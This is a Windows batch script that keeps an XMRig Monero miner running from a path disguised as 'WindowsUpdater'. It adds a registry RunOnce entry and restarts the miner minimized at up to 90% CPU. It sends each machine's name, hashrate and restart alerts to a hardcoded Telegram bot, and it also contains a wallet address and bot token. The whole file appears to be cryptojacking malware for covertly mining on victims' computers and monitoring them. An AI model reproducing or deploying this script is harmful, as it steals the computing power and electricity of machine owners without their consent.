@echo off
setlocal enabledelayedexpansion

:: === Configuration ===
set "MUTEX_FILE=%TEMP%\xmrig_watchdog.lock"
set "XMRIG_PATH=C:\ProgramData\WindowsUpdater\xmrig.exe"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "PASSWORD=%COMPUTERNAME%"
set "ALGO=rx/0"

:: Telegram
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

:: HTTP API Port for XMRig
set "API_PORT=16000"

:: === One-time cleanup on shutdown ===
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "XMRIG_Cleanup" /t REG_SZ /d "cmd /c del %TEMP%\xmrig_watchdog.lock" /f >nul 2>&1

:: === Prevent multiple watchdogs ===
if exist "!MUTEX_FILE!" (
    echo [!] Watchdog already running. Exiting.
    exit /b
)
echo locked > "!MUTEX_FILE!"

:: === Variables for timing ===
set "TICK=0"

:loop
:: === Check if miner is running ===
tasklist /fi "imagename eq xmrig.exe" | find /i "xmrig.exe" >nul
if errorlevel 1 (
    echo [*] XMRig not running. Starting...

    start /min "" "!XMRIG_PATH!" ^
        -o !POOL! -u !WALLET! -p !PASSWORD! -a !ALGO! -k ^
        --donate-level=0 --huge-pages --threads=auto ^
        --cpu-priority=4 --max-cpu-usage=90 ^
        --http-port=!API_PORT!

    timeout /t 10 >nul
    set "TICK=420"  :: force stats message after restart

    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
        -d "chat_id=!TG_CHAT_ID!" ^
        -d "text=⚠️ *XMRig restarted* on *!COMPUTERNAME!* at %date% %time%" ^
        -d "parse_mode=Markdown"
)

:: === Check if time to send stats (every 7 min = 420 sec) ===
set /a TICK+=30
if !TICK! GEQ 420 (
    set "TICK=0"
    echo [*] Fetching miner stats...

    for /f "tokens=* delims=" %%s in (
        'powershell -Command "try {(Invoke-WebRequest -UseBasicParsing http://127.0.0.1:!API_PORT!/1/summary).Content} catch {''}"'
    ) do set "STATS=%%s"

    for /f "tokens=2 delims=:" %%H in ('echo !STATS! ^| findstr /i "hashrate"') do set "HASHRATE=%%H"
    for /f "tokens=2 delims=:" %%A in ('echo !STATS! ^| findstr /i "accepted"') do set "ACCEPTED=%%A"
    for /f "tokens=2 delims=:" %%M in ('echo !STATS! ^| findstr /i "msr"') do set "MSR=%%M"

    if not defined HASHRATE set "HASHRATE=Unavailable"
    if not defined ACCEPTED set "ACCEPTED=Unknown"
    if not defined MSR set "MSR=Unknown"

    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
        -d "chat_id=!TG_CHAT_ID!" ^
        -d "text=💻 *Status Report* for *!COMPUTERNAME!*:`n🔹 Hashrate: !HASHRATE!`n✅ Shares: !ACCEPTED!`n🧠 MSR Mod: !MSR!`n🕒 %date% %time%" ^
        -d "parse_mode=Markdown"
)

echo [✔] Miner running. Sleeping 30s...
timeout /t 30 >nul
goto loop
